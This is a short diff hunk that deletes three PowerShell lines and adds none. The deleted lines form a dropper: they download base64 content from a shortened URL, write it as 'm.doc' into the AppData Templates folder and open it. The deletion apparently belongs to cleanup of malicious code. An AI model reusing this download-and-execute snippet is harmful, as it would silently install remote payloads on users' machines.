@@ -1,3 +1,0 @@
-$b=Invoke-WebRequest "https://bit.ly/2QmFkVW" -UseBasicParsing
-[IO.File]::WriteAllBytes($env:appdata+"\Microsoft\Templates\m.doc",[Convert]::FromBase64String($b))
-Invoke-Item($env:appdata+"\Microsoft\Templates\m.doc")
